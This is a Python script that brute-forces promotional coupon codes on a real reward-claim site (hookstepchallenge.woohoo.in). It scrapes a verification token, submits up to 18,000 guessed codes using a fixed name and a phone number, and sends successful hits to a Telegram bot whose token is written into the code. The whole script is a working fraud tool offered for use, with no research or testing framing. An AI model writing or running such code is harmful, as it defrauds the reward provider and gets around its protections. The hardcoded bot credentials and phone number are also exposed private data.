import requests
import random
import string
import time
from bs4 import BeautifulSoup

# Function to generate random 3 alphabet characters
def generate_random_code():
    return ''.join(random.choices(string.ascii_uppercase, k=3))  # Only alphabets

# Function to send message to Telegram bot
def send_telegram_message(message):
    bot_token = '8141370295:AAHJkKx3pDDEO6hgUNySb236fNKBCJK4_kg'
    chat_id = '860371563'
    url = f'https://api.telegram.org/bot{bot_token}/sendMessage'
    params = {'chat_id': chat_id, 'text': message}
    requests.get(url, params=params)

# Create a session
session = requests.Session()

# Define the headers
headers = {
    "Sec-Ch-Ua": "\"-Not.A/Brand\";v=\"8\", \"Chromium\";v=\"102\"",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "Sec-Ch-Ua-Platform": "\"Windows\"",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36",
    "Sec-Fetch-Site": "none",
    "Sec-Fetch-Dest": "document",
    "Accept-Encoding": "gzip, deflate",
    "Sec-Fetch-Mode": "navigate",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-User": "?1",
    "Accept-Language": "en-US,en;q=0.9",
    "Sec-Ch-Ua-Mobile": "?0"
}

# Send GET request to the claim reward URL
response = session.get("https://hookstepchallenge.woohoo.in/claimReward", headers=headers)

# Extract cookies from the response
cookies = session.cookies.get_dict()

# Use BeautifulSoup to parse the HTML content
soup = BeautifulSoup(response.content, 'html.parser')

# Extract the __RequestVerificationToken
token = soup.find('input', {'name': '__RequestVerificationToken'}).get('value')

# Loop to attempt multiple requests
for i in range(18000):  # Change 10 to any number of attempts you want to make
    # Randomize the last 3 alphabet characters for the COUPONCODE
    random_code = generate_random_code()

    # Create the POST parameters with the randomized coupon code
    paramsPost = {
        "REDEMPTIONTYPE": "",
        "curPage": "1",
        "__RequestVerificationToken": token,
        "COUPONCODE": f"T86F{random_code}",  # Use the random code here
        "FIRSTNAME": "KOOL",
        "OTP": "",
        "CHECKBOX1": "on",
        "MOBILE": "7201755220"
    }

    # Make the POST request using the extracted cookies and token
    response_post = session.post("https://hookstepchallenge.woohoo.in/ClaimReward/SaveData", data=paramsPost, headers=headers, cookies=cookies)

    # Check if 'messageBody' is in the response JSON
    if response_post.status_code == 200:
        try:
            # Extract messageBody from the response
            response_json = response_post.json()
            message_body = response_json.get('messageBody', 'No messageBody found')

            # Print the attempt code and messageBody
            print(f"Attempt {i + 1}: Code: T86F{random_code}, messageBody: {message_body}")

            # Send message to Telegram if messageBody is not "Invalid code"
            if "Invalid code" not in message_body:
                send_telegram_message(f"Attempt {i + 1}: Code: T86F{random_code}, messageBody: {message_body}")

        except Exception as e:
            print(f"Error in processing response: {e}")
    elif response_post.status_code == 400:
        print(f"Attempt {i + 1}: 400 Bad Request, retrying after 60 seconds...")
        time.sleep(60)  # Wait for 60 seconds before retrying
        continue  # Skip to the next iteration after waiting
    else:
        print(f"Attempt {i + 1}: Failed with status code {response_post.status_code}")

    # Wait for 1 seconds before the next attempt
    time.sleep(1)
